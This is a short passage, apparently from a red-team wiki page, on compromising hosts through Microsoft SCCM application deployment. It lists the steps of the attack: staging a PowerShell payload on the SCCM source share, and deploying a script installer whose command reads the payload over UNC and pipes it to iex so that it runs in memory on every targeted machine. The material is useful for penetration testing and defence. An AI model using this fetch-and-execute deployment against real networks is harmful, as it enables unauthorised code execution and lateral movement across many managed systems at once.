## Compromise

* Create an application/package that utilizes PowerShell for payload deliery and execution
  * Create a PowerShell payload and throw it up on the public share SCCM uses (i.e. _sccmsource_)

{% endembed %}

* Create a Script installer application to fetch and execute your payload :
  * `cmd.exe /c "powershell.exe -c "gc \\serverName\sharedFolder\ApplicationFolder\payload.txt | iex""`
* Deploy the application to your target group and wait for the SCCM agents to check in
  * Payload is fetched over UNC and runs in memory
